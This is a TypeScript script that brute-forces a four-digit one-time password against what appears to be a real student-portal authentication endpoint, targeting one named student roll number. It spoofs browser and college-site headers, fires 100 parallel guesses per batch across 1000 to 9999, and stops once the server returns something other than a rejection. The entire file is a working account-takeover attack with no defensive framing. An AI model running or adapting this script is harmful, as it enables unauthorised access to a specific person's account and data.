import axios from "axios";
let stopExecution = false; 
async function sendRequest(otp: number) {
    let config = {
        method: 'get',
        maxBodyLength: Infinity,
        url: `https://dbchangesstudent.edwisely.com/auth/v3/getUserDetails?roll_number=rmkucb20117&otp=${otp}`,
        headers: { 
          'Accept': 'application/json, text/plain, */*', 
          'Accept-Language': 'en-US,en;q=0.9', 
          'Connection': 'keep-alive', 
          'Origin': 'https://nextgen.rmkec.ac.in', 
          'Referer': 'https://nextgen.rmkec.ac.in/', 
          'Sec-Fetch-Dest': 'empty', 
          'Sec-Fetch-Mode': 'cors', 
          'Sec-Fetch-Site': 'cross-site', 
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 
          'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 
          'sec-ch-ua-mobile': '?0', 
          'sec-ch-ua-platform': '"Windows"'
        }
      };
      
     
      
  try {
    const response = await axios.request(config);
    console.log(`OTP: ${otp}, Status: ${response.status}, Data: ${JSON.stringify(response.data)}`);
    if (response.data.status !== 422) {
        console.log(`Stopping execution as received status: ${response.status}`);
        stopExecution = true;
          }
  } catch (error) {

  }
}

async function main() {
  for (let i = 1000; i < 10000; i += 100) {
    const promises = [];
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j));
    }
    await Promise.all(promises);
    if (stopExecution) {
        break;
      }
  }
}

main();
